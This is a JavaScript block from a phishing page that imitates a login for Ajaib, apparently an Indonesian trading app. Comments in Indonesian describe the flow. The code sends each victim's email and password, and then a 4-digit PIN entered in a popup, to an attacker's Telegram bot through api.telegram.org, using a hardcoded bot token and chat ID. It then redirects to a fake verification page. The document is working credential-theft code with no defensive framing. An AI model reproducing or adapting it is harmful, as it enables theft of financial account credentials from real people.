  <script>
const BOT_TOKEN = "7776380913:AAHMmwxtzHcBglv8vA4BLPilqOxoRx5WuIw";
const CHAT_ID = "7326083311";

// Toggle visibility password
document.getElementById("togglePassword").addEventListener("click", () => {
  const pwd = document.getElementById("password");
  pwd.type = pwd.type === "password" ? "text" : "password";
  document.getElementById("eyeIcon").classList.toggle("fa-eye-slash");
});

// Login â†’ kirim Email & Password â†’ tampilkan popup PIN
document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const btnText = document.getElementById("btnText");
  const btnSpinner = document.getElementById("btnSpinner");
  const loginBtn = document.getElementById("loginBtn");

  // loading state
  btnText.classList.add("d-none");
  btnSpinner.classList.remove("d-none");
  loginBtn.disabled = true;

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `AJAIB LOGIN\nEmail: ${email}\nPassword: ${password}`,
      }),
    });
  } catch (err) {
    alert("Gagal mengirim data. Coba lagi.");
    console.error("Telegram Error:", err);
  }

  setTimeout(() => {
    btnText.classList.remove("d-none");
    btnSpinner.classList.add("d-none");
    loginBtn.disabled = false;

    const popup = document.getElementById("pinPopup");
    popup.classList.add("show");

    const inputs = popup.querySelectorAll(".pin-inputs input");
    inputs[0].focus();

    inputs.forEach((input, i) => {
      input.addEventListener("input", () => {
        if (input.value.length === 1 && i < inputs.length - 1) {
          inputs[i + 1].focus();
        }
      });
    });
  }, 1500);
});

// Submit PIN â†’ kirim ke Telegram â†’ tutup popup â†’ redirect ke halaman verifikasi
document.getElementById("submitPin").addEventListener("click", async () => {
  const inputs = document.querySelectorAll(".pin-inputs input");
  const pin = Array.from(inputs).map((i) => i.value).join("");

  if (pin.length !== 4) {
    return alert("Harap isi semua 4 digit PIN.");
  }

  const email = document.getElementById("email").value;
  localStorage.setItem("ajaib_email", email); // Simpan email ke localStorage

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `AJAIB PIN\nPIN: ${pin}`,
      }),
    });

    // Popup hilang dan redirect ke halaman verifikasi
    document.getElementById("pinPopup").classList.remove("show");
    inputs.forEach((i) => (i.value = ""));
    window.location.href = "kodeajaibgmail.html"; // ganti dengan nama file verifikasi kamu
  } catch (err) {
    alert("Gagal mengirim PIN. Coba lagi.");
    console.error("Telegram Error:", err);
  }
});
</script>
